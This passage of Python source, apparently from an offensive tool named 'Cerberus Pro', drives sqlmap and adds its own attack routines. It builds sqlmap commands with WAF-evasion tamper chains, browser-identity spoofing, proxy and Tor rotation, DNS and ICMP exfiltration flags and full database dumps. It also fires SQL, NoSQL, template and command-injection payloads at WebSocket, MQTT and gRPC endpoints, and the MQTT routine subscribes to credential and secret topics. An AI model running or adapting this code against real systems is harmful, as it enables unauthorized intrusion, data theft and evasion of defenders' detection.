                    if (datetime.now(timezone.utc) - started).total_seconds() > timeout_sec:
                        proc.kill()
                        await broadcast_log("SISTEMA", "WARN", f"[{vector_name}] se superó el tiempo máximo de espera ({timeout_sec}s)", {"vector": vector_name})
                        return OmniResult(vector=vector_name, vulnerable=False, evidence=evidence, command=cmd, exit_code=124)
                    await asyncio.sleep(0.05)

            if saw_end_marker and proc.poll() is None:
                try:
                    await asyncio.to_thread(proc.wait, 5)
                except Exception:
                    try:
                        await asyncio.to_thread(proc.terminate)
                    except Exception:
                        pass
                    try:
                        await asyncio.to_thread(proc.wait, 5)
                    except Exception:
                        try:
                            await asyncio.to_thread(proc.kill)
                        except Exception:
                            pass

            polled = proc.poll()
            exit_code = int(polled) if isinstance(polled, int) else 0
            # Drain any remaining buffered lines
            if proc.stdout:
                tail = await asyncio.to_thread(proc.stdout.read)
                for raw in (tail or "").splitlines():
                    text = str(raw or "").strip()
                    if not text:
                        continue
                    low = text.lower()
                    _capture_parameter_markers(text)
                    _capture_runtime_signals(text)
                    if any(x in low for x in [
                        "is vulnerable",
                        "appears to be injectable",
                        "identified the following injection",
                        "resumed the following injection point",
                    ]):
                        vulnerable = True
                    if any(x in low for x in ["retrieved:", "current user:", "current database:", "database:"]):
                        if text not in evidence:
                            evidence.append(text)
                    if ("parameter:" in low) or ("payload:" in low) or ("type:" in low):
                        if text not in evidence:
                            evidence.append(text)
                    if any(x in low for x in [
                        "no forms found",
                        "all tested parameters do not appear to be injectable",
                        "you must provide at least one parameter",
                    ]):
                        if text not in evidence:
                            evidence.append(text)
                    # --- Filtro de Traducción y Limpieza (Drain Loop) ---
                    if any(art in text for art in ["___", "__H__", "{1.", "|_ -|", "[.]", "sqlmap.org", "legal disclaimer"]):
                        pass 
                    else:
                        trans_text = text
                        # Complete lines or common phrases mapping
                        if "testing connection" in low: trans_text = "Validando conexión al vector objetivo..."
                        elif "heuristic (basic) test" in low: trans_text = "Iniciando análisis heurístico en parámetros..."
                        elif "it looks like the back-end" in low: trans_text = trans_text.replace("it looks like the back-end DBMS is", "El motor de Base de Datos es").replace("it looks like the back-end dbms is", "El motor devuelto es")
                        elif "fetching tables" in low: trans_text = "Extrayendo matriz de tablas..."
                        elif "fetching columns" in low: trans_text = "Extrayendo topología de columnas..."
                        elif "fetching entries" in low: trans_text = "Tirando datos de los registros..."
                        elif "resuming" in low and "dbms" in low: trans_text = trans_text.replace("resuming back-end DBMS", "Reanudando conexión con Motor Mapeado").replace("resuming back-end dbms", "Reconectando con")
                        elif "testing parameter" in low: trans_text = "Auditando comportamiento del parámetro..."
                        elif "is vulnerable" in low: trans_text = "[!!!] VULNERABILIDAD CRÍTICA CONFIRMADA [!!!]"
                        elif "resumed the following injection point" in low: trans_text = "Reanudando el análisis de inyección desde la caché:"
                        elif "the back-end dbms is" in low: trans_text = trans_text.replace("the back-end DBMS is", "Motor de Base de Datos identificado:").replace("the back-end dbms is", "Motor de DB:")
                        elif "fetching current user" in low: trans_text = "Obteniendo usuario actual de la Base de Datos..."
                        elif "retrieving the length of query output" in low: trans_text = "Calculando longitud del resultado de la consulta..."
                        elif "fetching current database" in low: trans_text = "Obteniendo nombre de la base de datos actual..."
                        elif "fetching database names" in low: trans_text = "Enumerando nombres de bases de datos..."
                        elif "fetching number of databases" in low: trans_text = "Calculando la cantidad de bases de datos..."
                        elif "fetching number of tables" in low: trans_text = "Calculando la cantidad de tablas para la base de datos..."
                        elif "you are advised to try a switch '--no-cast'" in low: trans_text = "[ADVERTENCIA] Problemas de recuperación continua. Cerberus intentará compensar."
                        elif "starting @" in low: trans_text = trans_text.replace("starting @", "Iniciando vector @")

                        # Partial substring replacements
                        trans_text = trans_text.replace("Parameter:", "Parámetro:")
                        trans_text = trans_text.replace("Type:", "Tipo:")
                        trans_text = trans_text.replace("Title:", "Título:")
                        trans_text = trans_text.replace("Payload:", "Carga Útil (Payload):")
                        trans_text = trans_text.replace("web server operating system:", "Sistema operativo del servidor web:")
                        trans_text = trans_text.replace("web application technology:", "Tecnología de la app web:")
                        trans_text = trans_text.replace("back-end DBMS:", "Motor backend DBMS:")
                        trans_text = trans_text.replace("resumed:", "Recuperado (Caché):")
                        trans_text = trans_text.replace("retrieved:", "Extraído:")
                        trans_text = trans_text.replace("current user:", "Usuario DBA logueado:")
                        trans_text = trans_text.replace("current database:", "Base de datos actual:")
                        trans_text = trans_text.replace("available databases", "Bases de datos disponibles")

                        await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] {trans_text}", {"vector": vector_name})

            for p in sorted(parameter_markers):
                marker = f"tested_parameter:{p}"
                if marker not in evidence:
                    evidence.append(marker)
            for sig in sorted(runtime_signal_markers):
                marker = f"runtime_signal:{sig}"
                if marker not in evidence:
                    evidence.append(marker)
            await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] finalizado code={exit_code}", {"vector": vector_name})
            return OmniResult(vector=vector_name, vulnerable=vulnerable, evidence=evidence, command=cmd, exit_code=exit_code)
        except subprocess.TimeoutExpired:
            await broadcast_log("SISTEMA", "WARN", f"[{vector_name}] tiempo de expiración asíncrono ({timeout_sec}s)", {"vector": vector_name})
            return OmniResult(vector=vector_name, vulnerable=False, evidence=evidence, command=cmd, exit_code=124)
        except Exception as exc:
            await broadcast_log("CERBERUS_PRO", "ERROR", f"[{vector_name}] error crítico en subproceso: {type(exc).__name__}: {exc}", {"vector": vector_name})
            return OmniResult(vector=vector_name, vulnerable=False, evidence=evidence, command=cmd, exit_code=1)

    kwargs = {
        "stdout": asyncio.subprocess.PIPE,
        "stderr": asyncio.subprocess.STDOUT,
    }
    if os.name == "nt":
        kwargs["creationflags"] = getattr(__import__("subprocess"), "CREATE_NEW_PROCESS_GROUP", 0)
    else:
        cpu_limit = int(os.environ.get("SCAN_RLIMIT_CPU_SECONDS", "900"))
        as_mb = int(os.environ.get("SCAN_RLIMIT_AS_MB", "2048"))
        def _set_limits():
            import resource
            resource.setrlimit(resource.RLIMIT_CPU, (cpu_limit, cpu_limit))
            max_bytes = as_mb * 1024 * 1024
            resource.setrlimit(resource.RLIMIT_AS, (max_bytes, max_bytes))
        kwargs["start_new_session"] = True
        kwargs["preexec_fn"] = _set_limits

    try:
        proc = await asyncio.create_subprocess_exec(*cmd, **kwargs)
    except NotImplementedError:
        return await _run_sync_fallback()
    await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] lanzado", {"vector": vector_name, "cmd": cmd})

    try:
        saw_end_marker = False
        while True:
            line = await asyncio.wait_for(proc.stdout.readline(), timeout=timeout_sec)
            if not line:
                break
            text = line.decode(errors="ignore").strip()
            if not text:
                continue
            low = text.lower()
            _capture_parameter_markers(text)
            _capture_runtime_signals(text)
            if any(x in low for x in [
                "is vulnerable",
                "appears to be injectable",
                "identified the following injection",
                "resumed the following injection point",
            ]):
                vulnerable = True
            if any(x in low for x in ["retrieved:", "current user:", "current database:", "database:"]):
                if text not in evidence:
                    evidence.append(text)
            if ("parameter:" in low) or ("payload:" in low) or ("type:" in low):
                if text not in evidence:
                    evidence.append(text)
            # Negative coverage markers (useful to avoid false "SAFE" reports).
            if any(x in low for x in [
                "no forms found",
                "all tested parameters do not appear to be injectable",
                "you must provide at least one parameter",
            ]):
                if text not in evidence:
                    evidence.append(text)
            await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] {text}", {"vector": vector_name})
            if ("[*] ending @" in low) or ("ending @" in low and "[*]" in low):
                saw_end_marker = True
                break
        if saw_end_marker and proc.returncode is None:
            try:
                await asyncio.wait_for(proc.wait(), timeout=5)
            except Exception:
                try:
                    proc.terminate()
                except Exception:
                    pass
    except asyncio.TimeoutError:
        proc.kill()
        await broadcast_log("SISTEMA", "WARN", f"[{vector_name}] timeout {timeout_sec}s", {"vector": vector_name})

    exit_code = await proc.wait()
    for p in sorted(parameter_markers):
        marker = f"tested_parameter:{p}"
        if marker not in evidence:
            evidence.append(marker)
    for sig in sorted(runtime_signal_markers):
        marker = f"runtime_signal:{sig}"
        if marker not in evidence:
            evidence.append(marker)
    await broadcast_log("CERBERUS_PRO", "INFO", f"[{vector_name}] finalizado code={exit_code}", {"vector": vector_name})
    return OmniResult(vector=vector_name, vulnerable=vulnerable, evidence=evidence, command=cmd, exit_code=exit_code)


def build_vector_commands(
    python_exec: str,
    sqlmap_path: str,
    target_url: str,
    sql_config: Dict[str, object],
    stealth_args: List[str],
    polymorphic: PolymorphicEvasionEngine,
    vectors: List[str],
    omni_cfg: Optional[Dict[str, object]] = None,
) -> List[Tuple[str, List[str]]]:
    out: List[Tuple[str, List[str]]] = []
    base = [
        python_exec,
        sqlmap_path,
        "--batch",
        "--disable-coloring",
        "--answers=follow=Y,redirect=Y,resend=Y,form=Y,blank=Y,quit=N,sitemap=N,normalize crawling results=Y,store crawling results=N,test this form=Y,fill blank fields with random values=Y,further target testing=Y",
        "-u",
        target_url,
    ]

    parsed_target = urlparse(str(target_url or ""))
    query_params = parse_qs(parsed_target.query, keep_blank_values=True)
    has_query_params = bool(query_params)
    raw_cfg_params = (omni_cfg or {}).get("parameters", (omni_cfg or {}).get("params", []))
    if isinstance(raw_cfg_params, str):
        cfg_params = [p.strip() for p in raw_cfg_params.split(",") if p.strip()]
    elif isinstance(raw_cfg_params, list):
        cfg_params = [str(p).strip() for p in raw_cfg_params if str(p).strip()]
    else:
        cfg_params = []
    has_cfg_params = len(cfg_params) > 0
    auto_discover_inputs = bool((omni_cfg or {}).get("autoDiscoverInputs", True))
    single_discovery_pass = bool((omni_cfg or {}).get("singleDiscoveryPass", True))
    discovery_already_applied = bool((omni_cfg or {}).get("discoveryAlreadyApplied", False))
    discovery_flags: List[str] = []
    if auto_discover_inputs and (not has_query_params) and (not has_cfg_params):
        raw_crawl_depth = (omni_cfg or {}).get("crawlDepth", (sql_config or {}).get("crawlDepth", 2))
        try:
            crawl_depth = max(1, min(5, int(raw_crawl_depth)))
        except Exception:
            crawl_depth = 2
        discovery_flags = ["--forms", f"--crawl={crawl_depth}"]
    
    if sql_config.get("level"):
        base.append(f"--level={int(sql_config['level'])}")
    if sql_config.get("risk"):
        base.append(f"--risk={int(sql_config['risk'])}")
    if sql_config.get("threads"):
        base.append(f"--threads={int(sql_config['threads'])}")
    
    # Advanced: Extra Data / Chaining
    # Advanced: Extra Data / Chaining
    # Removed raw extraData append to avoid argument conflicts (handled by caller)

    base.extend(stealth_args)

    # 2026: WAF/Evasion Profiles
    # These profiles override or augment existing flags
    profile = (omni_cfg or {}).get("profile", "").lower()
    confirmed_waf = bool(polymorphic.waf_type and polymorphic.waf_type in WAF_TAMPER_PRESETS and polymorphic.waf_type != "general_strong")
    force_evasion = bool((omni_cfg or {}).get("forceEvasion", False))
    human_mode = bool((omni_cfg or {}).get("humanMode", False))
    apply_evasion = bool(force_evasion or confirmed_waf)

    # Optional explicit delay override from config. If absent, only apply jitter when WAF is confirmed.
    delay_override: Optional[float] = None
    raw_delay = (sql_config or {}).get("delay")
    if raw_delay is None:
        raw_delay = (omni_cfg or {}).get("delay")
    if raw_delay is not None:
        try:
            parsed_delay = float(raw_delay)
            if parsed_delay > 0:
                delay_override = parsed_delay
        except Exception:
            delay_override = None

    # Prefer explicit tamper list from config. On non-confirmed WAF, prune oversized lists
    # to reduce false negatives/timeouts caused by over-tampering.
    configured_tampers: List[str] = []
    raw_tamper = (sql_config or {}).get("tamper")
    if isinstance(raw_tamper, str):
        configured_tampers = [t.strip() for t in raw_tamper.split(",") if t and t.strip()]
    elif isinstance(raw_tamper, list):
        configured_tampers = [str(t).strip() for t in raw_tamper if str(t).strip()]

    # v4.1: Advanced JSON Intelligence
    if "json" in profile:
        base.append("--json-data")
        base.append("--method=POST")
        # Nested object probing (logical hint for sqlmap)
        if omni_cfg.get("jsonDepth"):
            base.append(f"--param-del=&") # Force different param parsing
    
    # v4.1: HTTP Verb Switching
    if omni_cfg and omni_cfg.get("method"):
        base.append(f"--method={omni_cfg['method']}")
    
    if "hpp" in profile:
        base.append("--hpp")
    
    if "aggressive" in profile:
        base.append("--risk=3")
        base.append("--level=5")

    # Advanced: OOB (Out-of-Band)
    if omni_cfg and omni_cfg.get("oob"):
        oob = omni_cfg["oob"]
        if oob.get("dnsDomain"):
            base.append(f"--dns-domain={oob['dnsDomain']}")
        if oob.get("icmp"):
            base.append("--icmp-exfiltration")

    # Advanced: Pivoting / Proxy
    if omni_cfg and omni_cfg.get("pivoting"):
        piv = omni_cfg["pivoting"]
        if piv.get("proxy"):
            base.append(f"--proxy={piv['proxy']}")
        if piv.get("tor"):
            base.append("--tor")
            base.append("--check-tor")

    # Polymorphic payload mutation (optional)
    #
    # NOTE:
    # sqlmap does not support supplying an arbitrary "payload list file" directly.
    # We keep PayloadMutationEngine for non-sqlmap surfaces (WS/gRPC/etc) and for
    # documentation/testing, but we must NOT add invalid flags here (e.g. empty
    # --prefix/--suffix), which can break execution.
    #
    # If you want to leverage custom payloads with sqlmap, the correct approach
    # is to implement custom tamper scripts or use sqlmap-supported knobs
    # (--prefix/--suffix with concrete values, --eval, etc.) in a controlled way.

    for idx, vec in enumerate(vectors):
        tech = VECTOR_TECHNIQUES.get(vec.upper())
        if not tech:
            continue
        cmd = list(base)
        if discovery_flags and (not discovery_already_applied) and (not single_discovery_pass or idx == 0):
            cmd.extend(discovery_flags)
        cmd.append(f"--technique={tech}")
        # Choose User-Agent. Allow orchestrator to force a UA family change when rotating identity.
        force_change_ua_family = bool((omni_cfg or {}).get("forceChangeUAFamily", False))
        if force_change_ua_family:
            # Prefer a Firefox-like UA when forcing a change (fall back gracefully).
            chosen_ua = polymorphic.get_random_ua_of_family("firefox")
        else:
            chosen_ua = polymorphic.get_random_ua()
        cmd.append(f"--user-agent={chosen_ua}")
        
        # Master-level evasion (Evasión 5/5): Synchronize FULL identity (TLS + HTTP headers)
        # Don't just change UA—synchronize Client Hints to match UA family
        ua_family = TLSFingerprintManager.get_ua_family_from_string(chosen_ua)
        sec_ch_ua = TLSFingerprintManager.get_sec_ch_ua(ua_family)
        ja3_fp = TLSFingerprintManager.get_ja3_fingerprint(ua_family)
        
        # Inject Client Hints headers that match UA family (critical for real browser detection bypass)
        # Format: --headers="Header: value" can be repeated
        cmd.append(f"--headers=Sec-CH-UA: {sec_ch_ua}")
        cmd.append(f"--headers=Sec-CH-UA-Mobile: ?0")
        cmd.append(f"--headers=Sec-CH-UA-Platform: \\\"Linux\\\"")
        
        # Optional: inject TLS fingerprint metadata for debugging/logging
        cmd.append(f"--headers=X-TLS-Fingerprint: {ja3_fp}")

        # Synchronize transport identity: set Accept header consistent with UA
        accept_value = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
        if "iphone" in chosen_ua.lower() or "mobile" in chosen_ua.lower():
            accept_value = "text/html,application/xhtml+xml,application/xml;q=0.9"
        # Inject Accept header to avoid UA/Accept mismatches that look bot-like
        cmd.append(f"--headers=Accept: {accept_value}")

        # Phase 2 Evasion: Content-Type & Header Mutation
        if apply_evasion:
            cmd.append(f"--headers=X-Forwarded-For: 127.0.0.1")
            cmd.append(f"--headers=Referer: {target_url}")
            
            cfg_method = (omni_cfg or {}).get("method", "GET").upper()
            if cfg_method in ("GET", "POST") and force_evasion:
                if "json" not in profile:
                    # Switch method to see if WAF rules only apply to GET/POST
                    cmd = [c for c in cmd if not c.startswith("--method=")]
                    cmd.append("--method=PUT")
            
            if cfg_method in ("POST", "PUT") or force_evasion:
                # Alternate Content-Type
                ct = random.choice(["application/json", "multipart/form-data"])
                # Remove existing generic Content-Type headers if any (managed by sqlmap natively, but we can override)
                cmd.append(f"--headers=Content-Type: {ct}")
                if ct == "application/json" and not any(c.startswith("--data=") for c in cmd):
                    cmd.append("--data={\"cerberus_pad\":\"v1\"}")


        # Dynamic per-vector jitter: recalc for each vector to break rhythmic patterns.
        delay_value: Optional[float] = delay_override
        if delay_value is None and (human_mode or confirmed_waf):
            # Choose a slightly different base when human_mode is explicitly enabled
            base_for_jitter = 0.15 if human_mode else 0.05
            delay_value = polymorphic.traffic_jitter(base_delay=base_for_jitter)
        if delay_value is not None:
            cmd.append(f"--delay={round(float(delay_value), 2)}")

        tamper_chain = ""
        if configured_tampers and apply_evasion:
            selected = list(configured_tampers)
            if (not confirmed_waf) and (not force_evasion) and len(selected) > 2:
                selected = selected[:2]
            tamper_chain = ",".join(selected)
        elif confirmed_waf:
            tamper_chain = polymorphic.generate_tamper_chain(size=3)
        if tamper_chain:
            cmd.append(f"--tamper={tamper_chain}")

        # Inject cookies/tokens provided by Playwright bypass into the vector when requested
        try:
            force_cookies = (omni_cfg or {}).get("forceEvasionCookies") or (omni_cfg or {}).get("persisted_cookie_header")
            if force_cookies:
                cmd.append(f"--cookie={force_cookies}")
        except Exception:
            pass

        # Support rotating proxy/identity when orchestrator requests it via omni_cfg
        try:
            rotate_proxy = bool((omni_cfg or {}).get("rotateProxy", False))
            piv = (omni_cfg or {}).get("pivoting", {}) or {}
            proxies = piv.get("proxies") or piv.get("proxy_list") or []
            if rotate_proxy and proxies:
                # choose a proxy at random for this vector execution
                proxy_choice = random.choice(list(proxies))
                cmd.append(f"--proxy={proxy_choice}")
                # Ensure User-Agent rotation aligned with proxy identity
                cmd.append(f"--random-agent")
                # If orchestrator requested a forced UA family change with proxy rotation,
                # ensure UA does not remain in the same family as previous.
                if force_change_ua_family:
                    # re-select UA to align with requested family
                    try:
                        chosen_ua = polymorphic.get_random_ua_of_family("firefox")
                        # replace existing UA flag
                        cmd = [c for c in cmd if not c.startswith("--user-agent=")]
                        cmd.append(f"--user-agent={chosen_ua}")
                    except Exception:
                        pass
        except Exception:
            pass

        # Support quick extraction flags requested by orchestrator
        try:
            if sql_config.get("currentUser"):
                cmd.append("--current-user")
            if sql_config.get("currentDb"):
                cmd.append("--current-db")
            if sql_config.get("getDbs"):
                cmd.append("--dbs")
            if sql_config.get("getTables"):
                cmd.append("--tables")
            if sql_config.get("dumpAll"):
                cmd.append("--dump")
        except Exception:
            pass

        out.append((vec.upper(), cmd))
    return out


def detect_honeypot_uniformity(status_codes: List[int], body_hashes: List[str]) -> bool:
    """Simple heuristic: overly uniform responses may indicate a trap/honeypot."""
    if not status_codes or not body_hashes:
        return False
    same_status = len(set(status_codes)) == 1
    same_body = len(set(body_hashes)) == 1
    return same_status and same_body and len(status_codes) >= 5


def direct_db_reachability(engine: str, host: str, port: int, timeout: float = 2.5) -> Dict[str, object]:
    started = datetime.now(timezone.utc).isoformat()
    try:
        with socket.create_connection((host, port), timeout=timeout):
            return {
                "engine": engine,
                "host": host,
                "port": port,
                "reachable": True,
                "timestamp": started,
                "detail": "socket_open",
            }
    except Exception as exc:
        return {
            "engine": engine,
            "host": host,
            "port": port,
            "reachable": False,
            "timestamp": started,
            "detail": str(exc),
        }


async def websocket_exploit(url: str, config: Optional[Dict] = None, timeout: float = 10.0) -> Dict[str, object]:
    """
    Exploit WebSocket endpoints — SQLi, NoSQL, SSTI, and data extraction.
    Replaces the old websocket_probe() which only checked connectivity.
    """
    results: Dict[str, object] = {
        "url": url,
        "reachable": False,
        "vulnerable": False,
        "vulnerabilities": [],
        "extracted_data": {},
        "detail": "",
    }

    try:
        import websockets  # type: ignore
    except ImportError:
        results["detail"] = "missing websockets lib"
        return results

    # SQLi payloads for WebSocket fuzzing
    sqli_payloads = [
        "1' OR '1'='1", "admin'--", "' UNION SELECT NULL--",
        "1; WAITFOR DELAY '0:0:3'--", "1' AND 1=CONVERT(int,@@version)--",
    ]
    nosql_payloads = [
        '{"$ne": null}', '{"$gt": ""}', '{"$regex": ".*"}',
        '{"$where": "1==1"}',
    ]
    ssti_payloads = ["{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}"]
    cmdi_payloads = ["; id", "| whoami", "`id`", "$(whoami)"]

    try:
        async with websockets.connect(url, open_timeout=timeout, close_timeout=timeout) as ws:
            results["reachable"] = True

            # Probe: initial handshake
            try:
                await ws.send(json.dumps({"type": "ping"}))
                resp = await asyncio.wait_for(ws.recv(), timeout=3)
                results["extracted_data"]["initial_response"] = str(resp)[:500]
            except Exception:
                pass

            # SQLi fuzzing across different JSON fields
            # Reduce false positives: require multiple distinct payloads to trigger DB error signatures.
            sqli_hits_by_payload = set()
            for payload in sqli_payloads:
                test_msgs = [
                    json.dumps({"type": payload}),
                    json.dumps({"id": payload}),
                    json.dumps({"query": payload}),
                    json.dumps({"search": payload, "page": 1}),
                ]
                for msg in test_msgs:
                    try:
                        await ws.send(msg)
                        resp = await asyncio.wait_for(ws.recv(), timeout=3)
                        resp_lower = str(resp).lower()
                        # Check for SQL error signatures
                        if any(sig in resp_lower for sig in [
                            "sql syntax", "mysql", "postgresql", "sqlite",
                            "unterminated", "syntax error", "odbc", "mssql",
                            "oracle", "you have an error",
                        ]):
                            sqli_hits_by_payload.add(payload)
                            results["vulnerabilities"].append({
                                "type": "SQLi",
                                "payload": payload,
                                "evidence": str(resp)[:200],
                            })
                    except Exception:
                        continue
            if len(sqli_hits_by_payload) >= 2:
                results["vulnerable"] = True

            # NoSQL fuzzing
            for payload in nosql_payloads:
                try:
                    await ws.send(json.dumps({"filter": json.loads(payload)}))
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    resp_str = str(resp)
                    if len(resp_str) > 100 and "error" not in resp_str.lower():
                        results["vulnerabilities"].append({
                            "type": "NoSQL_Injection",
                            "payload": payload,
                            "evidence": resp_str[:200],
                        })
                        results["vulnerable"] = True
                except Exception:
                    continue

            # SSTI fuzzing
            for payload in ssti_payloads:
                try:
                    await ws.send(json.dumps({"template": payload, "name": payload}))
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    if "49" in str(resp) and payload not in str(resp):
                        results["vulnerable"] = True
                        results["vulnerabilities"].append({
                            "type": "SSTI",
                            "payload": payload,
                            "evidence": str(resp)[:200],
                        })
                except Exception:
                    continue

            # Command injection fuzzing
            for payload in cmdi_payloads:
                try:
                    await ws.send(json.dumps({"cmd": payload, "action": payload}))
                    resp = await asyncio.wait_for(ws.recv(), timeout=3)
                    resp_str = str(resp).lower()
                    if any(sig in resp_str for sig in ["uid=", "root", "www-data", "nt authority"]):
                        results["vulnerable"] = True
                        results["vulnerabilities"].append({
                            "type": "Command_Injection",
                            "payload": payload,
                            "evidence": str(resp)[:200],
                        })
                except Exception:
                    continue

    except Exception as exc:
        results["detail"] = str(exc)

    return results


# Backward compatibility alias
websocket_probe = websocket_exploit


async def mqtt_exploit(host: str, port: int = 1883, timeout: float = 8.0, config: Optional[Dict] = None) -> Dict[str, object]:
    """
    Exploit MQTT endpoints — auth bypass, topic fuzzing, payload injection.
    Replaces the old mqtt_probe() which only checked TCP connectivity.
    """
    results: Dict[str, object] = {
        "host": host,
        "port": port,
        "reachable": False,
        "vulnerable": False,
        "vulnerabilities": [],
        "topics_discovered": [],
        "detail": "",
    }

    # Phase 0: TCP reachability check
    reach = direct_db_reachability(engine="mqtt", host=host, port=port, timeout=min(timeout, 3))
    if not reach.get("reachable"):
        results["detail"] = "port not reachable"
        return results
    results["reachable"] = True

    try:
        import paho.mqtt.client as mqtt_client  # type: ignore
    except ImportError:
        results["detail"] = "missing paho-mqtt lib — install with: pip install paho-mqtt"
        # Still return reachability info
        return results

    discovered_topics: list = []
    received_messages: list = []
    auth_bypass = False

    def on_connect(client, userdata, flags, rc, properties=None):
        nonlocal auth_bypass
        if rc == 0:
            auth_bypass = True
            # Subscribe to sensitive topics
            sensitive_topics = [
                "$SYS/#", "#", "+/admin/#", "+/config/#",
                "+/credentials/#", "+/password/#", "+/secret/#",
            ]
            for topic in sensitive_topics:
                try:
                    client.subscribe(topic, qos=0)
                except Exception:
                    pass

    def on_message(client, userdata, msg):
        topic = str(msg.topic)
        payload_str = msg.payload.decode(errors="ignore")[:500]
        if topic not in discovered_topics:
            discovered_topics.append(topic)
        received_messages.append({"topic": topic, "payload": payload_str[:200]})

    # Phase 1: Anonymous connection attempt
    try:
        client = mqtt_client.Client(client_id=f"cerberus_probe_{random.randint(1000,9999)}",
                                     protocol=mqtt_client.MQTTv311)
        client.on_connect = on_connect
        client.on_message = on_message
        client.connect(host, port, keepalive=int(timeout))
        client.loop_start()
        await asyncio.sleep(min(timeout, 5))  # Listen for messages
        client.loop_stop()
        client.disconnect()
    except Exception as e:
        results["detail"] = f"MQTT connection failed: {e}"

    if auth_bypass:
        results["vulnerable"] = True
        results["vulnerabilities"].append({
            "type": "Anonymous_Access",
            "detail": "Anonymous MQTT connection successful — broker allows unauthenticated clients",
        })

    if discovered_topics:
        results["topics_discovered"] = discovered_topics[:50]
        results["vulnerabilities"].append({
            "type": "Information_Disclosure",
            "detail": f"Discovered {len(discovered_topics)} topics",
            "topics": discovered_topics[:20],
        })
        results["vulnerable"] = True

    if received_messages:
        results["vulnerabilities"].append({
            "type": "Data_Exposure",
            "detail": f"Captured {len(received_messages)} messages",
            "sample": received_messages[:10],
        })
        results["vulnerable"] = True

    # Phase 2: Topic path traversal fuzzing
    traversal_topics = [
        "../admin", "..%2fadmin", "+/+/+/+/admin",
        "$SYS/broker/version", "$SYS/broker/uptime",
    ]
    fuzz_results = []
    try:
        client2 = mqtt_client.Client(client_id=f"cerberus_fuzz_{random.randint(1000,9999)}")
        fuzz_msgs = []

        def on_fuzz_msg(client, userdata, msg):
            fuzz_msgs.append({"topic": msg.topic, "payload": msg.payload.decode(errors="ignore")[:200]})

        client2.on_message = on_fuzz_msg
        client2.connect(host, port, keepalive=int(timeout))
        for topic in traversal_topics:
            try:
                client2.subscribe(topic, qos=0)
            except Exception:
                pass
        client2.loop_start()
        await asyncio.sleep(3)
        client2.loop_stop()
        client2.disconnect()

        if fuzz_msgs:
            results["vulnerabilities"].append({
                "type": "Path_Traversal",
                "detail": f"Traversal topics returned {len(fuzz_msgs)} messages",
                "sample": fuzz_msgs[:5],
            })
            results["vulnerable"] = True
    except Exception:
        pass

    return results


# Backward compatibility alias
mqtt_probe = mqtt_exploit


async def grpc_deep_fuzz_probe(host: str, port: int, timeout: float = 10.0) -> Dict[str, object]:
    """
    Real gRPC Fuzzer with reflection-based discovery and payload injection.
    No longer uses simulated/hardcoded results.

    Phases:
    1. Connectivity check
    2. Reflection to discover real services/methods
    3. Fuzzing discovered methods with injection payloads
    4. Error analysis for information disclosure
    """
    results: Dict[str, object] = {
        "host": host,
        "port": port,
        "reachable": False,
        "reflection_enabled": False,
        "methods_discovered": [],
        "fuzzing_status": "skipped",
        "vulnerabilities": [],
        "detail": "",
    }

    try:
        import grpc  # type: ignore
    except ImportError:
        results["detail"] = "missing grpc lib — install grpcio"
        return results

    target = f"{host}:{port}"
    channel = None

    try:
        # Phase 1: Connectivity
        channel = grpc.aio.insecure_channel(target)
        await asyncio.wait_for(channel.channel_ready(), timeout=timeout)
        results["reachable"] = True

        # Phase 2: Real reflection discovery
        try:
            from grpc_reflection.v1alpha import reflection_pb2, reflection_pb2_grpc  # type: ignore

            stub = reflection_pb2_grpc.ServerReflectionStub(channel)
            # List all services via reflection
            request = reflection_pb2.ServerReflectionRequest(
                list_services=""
            )
            responses = stub.ServerReflectionInfo(iter([request]))
            async for response in responses:
                if response.HasField("list_services_response"):
                    for svc in response.list_services_response.service:
                        results["methods_discovered"].append(svc.name)
                    results["reflection_enabled"] = True
        except Exception as refl_err:
            results["detail"] = f"Reflection unavailable: {refl_err}"

        # Phase 2b: Brute-force common service names if reflection failed
        if not results["methods_discovered"]:
            common_services = [
                "grpc.health.v1.Health",
                "grpc.reflection.v1alpha.ServerReflection",
            ]
            for svc in common_services:
                try:
                    # Attempt to call Check method on health service
                    from grpc_health.v1 import health_pb2, health_pb2_grpc  # type: ignore
                    health_stub = health_pb2_grpc.HealthStub(channel)
                    resp = await asyncio.wait_for(
                        health_stub.Check(health_pb2.HealthCheckRequest()),
                        timeout=3
                    )
                    results["methods_discovered"].append(f"{svc}/Check")
                except Exception:
                    pass

        # Phase 3: Fuzzing discovered methods with injection payloads
        #
        # Reflection list_services returns service names, not method names. Only fuzz:
        # - entries already in "Service/Method" form (e.g. grpc.health.v1.Health/Check)
        # - or derived known methods we actually confirmed in Phase 2b.
        call_targets = [m for m in results["methods_discovered"] if "/" in str(m)]
        if call_targets:
            results["fuzzing_status"] = "running"

            fuzz_payloads = [
                b"\x00" * 100,          # Null bytes
                b"A" * 10000,            # Buffer overflow
                b"' OR 1=1--",           # SQLi in string fields
                b"{{7*7}}",              # SSTI
                b"\xff\xfe" * 50,        # Unicode overflow
                b"{\"$ne\": null}",     # NoSQL
            ]

            for method_name in call_targets[:10]:
                for payload in fuzz_payloads:
                    try:
                        # Send raw unary call with malformed payload
                        resp = await asyncio.wait_for(
                            channel.unary_unary(
                                f"/{method_name}",
                                request_serializer=lambda x: x,
                                response_deserializer=lambda x: x,
                            )(payload),
                            timeout=3,
                        )
                        # If we get a response to malformed data, that's interesting
                        results["vulnerabilities"].append({
                            "type": "Unexpected_Response",
                            "method": method_name,
                            "payload_size": len(payload),
                            "response_size": len(resp) if resp else 0,
                        })
                    except grpc.aio.AioRpcError as rpc_err:
                        # Analyze error details for info disclosure
                        error_details = str(rpc_err.details()) if rpc_err.details() else ""
                        if any(sig in error_details.lower() for sig in [
                            "sql", "database", "table", "column", "stack trace",
                            "exception", "traceback", "internal", "debug",
                        ]):
                            results["vulnerabilities"].append({
                                "type": "Information_Disclosure",
                                "method": method_name,
                                "detail": error_details[:500],
                            })
                    except Exception:
                        continue

            results["fuzzing_status"] = "completed"

        if results["vulnerabilities"]:
            results["vulnerable"] = True

    except asyncio.TimeoutError:
        results["detail"] = "connection timeout"
    except Exception as exc:
        results["detail"] = str(exc)
    finally:
        if channel:
            try:
                await channel.close()
            except Exception:
                pass

    return results

